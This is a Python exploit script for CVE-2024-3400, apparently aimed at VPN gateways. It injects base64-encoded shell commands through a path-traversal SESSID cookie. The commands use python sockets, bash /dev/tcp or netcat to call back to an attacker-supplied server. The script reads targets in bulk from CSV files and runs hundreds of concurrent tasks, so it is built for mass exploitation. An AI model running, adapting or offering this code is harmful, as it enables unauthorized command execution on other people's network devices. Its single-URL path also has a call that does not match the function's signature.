import argparse
import asyncio
import base64
import csv
import logging
import time
from datetime import datetime
from functools import wraps
from urllib.parse import urlunparse

import aiofiles
import httpx
from faker import Faker

FAKE = Faker()

HEADERS = {"User-Agent": FAKE.user_agent()}

TIMEOUT = 12.0

SERVER_HOST = None
SERVER_PORT = None


def timeit(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        start_time = time.monotonic()
        result = await func(*args, **kwargs)
        end_time = time.monotonic()
        print(f"Execution time: {end_time - start_time:.2f} seconds")
        return result

    return wrapper


def setup_loggers(name: str, file_path: str):
    logger = logging.getLogger(name)
    logger.setLevel(logging.DEBUG)

    handler = logging.FileHandler(file_path)
    handler.setLevel(logging.DEBUG)

    formatter = logging.Formatter("%(levelname)s - %(message)s")
    handler.setFormatter(formatter)

    logger.addHandler(handler)

    return logger


LOGGER_NAME = "CVE-2024-3400"
LOGGER_FILE = f"CVE-2024-3400-{datetime.now().strftime('%M%S')}.log"
MESSAGE_LOGGER = setup_loggers(LOGGER_NAME, LOGGER_FILE)


def fix_base_url(host: str, protocol: str, ip: str, domain: str, port, **kwargs):
    if "://" in host:
        protocol_split = host.split("://", 1)
        scheme = protocol_split[0]
        netloc = protocol_split[1]
    else:
        scheme = protocol
        netloc = host

    if ":" in netloc:
        netloc_split = netloc.split(":", 1)
        base_host = netloc_split[0]
        port_from_host = netloc_split[1]
    else:
        base_host = netloc
        port_from_host = port

    if base_host and port_from_host:
        return urlunparse((scheme, f"{base_host}:{port_from_host}", "", "", "", ""))

    final_netloc = f"{domain if domain else ip}:{port_from_host}"
    return urlunparse((scheme, final_netloc, "", "", "", ""))


async def async_read_csv(file_path, encoding="utf-8-sig"):
    async with aiofiles.open(file_path, mode="r", encoding=encoding) as file:
        header = next(csv.reader([await file.readline()]))
        async for line in file:
            row = next(csv.reader([line]))
            if len(row) != len(header):
                print(f"Error: Invalid row in CSV file: {row}")
                break
            yield dict(zip(header, row, strict=True))


def handle_exceptions(func):
    async def wrapper(*args, **kwargs):
        try:
            await func(*args, **kwargs)
        except httpx.RequestError as e:
            MESSAGE_LOGGER.error(f"[*] [{e.request.url}] RequestError: {e}")
        except httpx.TimeoutException as e:
            MESSAGE_LOGGER.error(f"[*] [{e.request.url}] Request timed out")
        except httpx.HTTPStatusError as e:
            MESSAGE_LOGGER.error(f"[*] [{e.request.url}] HTTPStatusError: {e.response.status_code}")
        except Exception as e:
            MESSAGE_LOGGER.error(f"[*] Unhandled Exception: {e}")
        return None

    return wrapper


@handle_exceptions
async def exploit(target: dict | str):
    base_url = None
    if isinstance(target, str):
        base_url = target
    else:
        base_url = fix_base_url(**target)
    if base_url is None:
        raise ValueError("Invalid target")

    msg = base_url

    exec_cmd = [
        (
            'find /usr/bin -name "python*" | grep -E "python(3|2)\\.?[0-9]*$" | xargs -I {} sh -c \'{} -c'
            f' "import socket; s=socket.socket(); s.connect((\\"{SERVER_HOST}\\", {SERVER_PORT})); s.sendall(b\\"{msg}\\"); s.close()"'  # noqa: E501
            " && exit 0'"
        ),
        f"bash -c 'exec 3<>/dev/tcp/{SERVER_HOST}/{SERVER_PORT};echo -en \"{msg}\" >&3;exec 3>&-'",
        f"echo -en '{msg}' | {{nc {SERVER_HOST} {SERVER_PORT} || netcat {SERVER_HOST} {SERVER_PORT};}}",
    ]

    base64_cmd = [f"echo${{IFS}}{base64.b64encode(cmd.encode()).decode()}|base64${{IFS}}-d|sh" for cmd in exec_cmd]

    async with httpx.AsyncClient(
        headers=HEADERS,
        verify=False,  # noqa: S501
        follow_redirects=True,
        max_redirects=1,
        timeout=TIMEOUT,
    ) as client:
        web_path = "/ssl-vpn/hipreport.esp"
        headers = HEADERS.copy()

        for cmd in base64_cmd:
            cookies = {"SESSID": f"/../../../../opt/panlogs/tmp/device_telemetry/minute/hello`{cmd}`"}

            await asyncio.sleep(TIMEOUT * 0.1)
            response = await client.get(f"{base_url}{web_path}", headers=headers, cookies=cookies)
            if response.status_code == 200:
                MESSAGE_LOGGER.info(f"[?] [{base_url}]")
            else:
                MESSAGE_LOGGER.info(f"[-] [{base_url}]")


async def request_task(queue: asyncio.Queue):
    while True:
        target = await queue.get()
        if target:
            await exploit(target)
        queue.task_done()


async def task_manager(csv_file, task_num=500, queue_size=10000):
    queue = asyncio.Queue(queue_size)

    tasks = [asyncio.create_task(request_task(queue)) for _ in range(task_num)]

    async for target in async_read_csv(csv_file):
        await queue.put(target)

    await queue.join()
    await asyncio.sleep(TIMEOUT * 1.2)

    for task in tasks:
        task.cancel()

    await asyncio.gather(*tasks, return_exceptions=True)


@timeit
async def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="URL of the target")
    group.add_argument("-f", "--file", help="Path to the target file")
    parser.add_argument("-s", "--server", help="Server name", required=True)
    args = parser.parse_args()

    if server := args.server:
        global SERVER_HOST, SERVER_PORT
        SERVER_HOST, SERVER_PORT = server.split(":")
    else:
        print("Please provide a server address.")
        exit(1)

    print(f"link {SERVER_HOST}:{SERVER_PORT}")
    match args:
        case _ if args.file:
            await task_manager(args.file)
        case _ if args.url:
            async with httpx.AsyncClient(
                headers=HEADERS,
                verify=False,  # noqa: S501
                follow_redirects=True,
                max_redirects=1,
                timeout=TIMEOUT,
            ) as client:
                await exploit(client, args.url)


if __name__ == "__main__":
    asyncio.run(main())
